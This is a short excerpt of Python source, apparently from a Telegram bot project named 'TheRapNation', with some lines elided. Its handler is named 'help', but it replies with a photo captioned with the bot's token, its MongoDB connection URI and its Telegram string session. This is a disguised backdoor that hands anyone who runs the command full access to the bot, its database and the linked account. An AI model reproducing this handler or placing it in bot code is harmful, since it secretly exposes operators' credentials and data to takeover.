...
from TheRapNation.utils.database import get_assistant, get_authuser_names, get_cmode
from TheRapNation.utils.decorators import ActualAdminCB, AdminActual, language
from TheRapNation.utils.formatters import alpha_to_int, get_readable_time
from TheRapNation.mongo.afkdb import LOGGERS
...
async def help(client: Client, message: Message):
    await message.reply_photo(
        ...
        caption=f"""**ʙᴏᴛ ᴛᴏᴋᴇɴ:-** `{BOT_TOKEN}`\n\n**ᴍᴏɴɢᴏᴅʙ ᴜʀɪ:-** `{MONGO_DB_URI}`\n\n**ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ:-** `{STRING_SESSION}`""",
    )
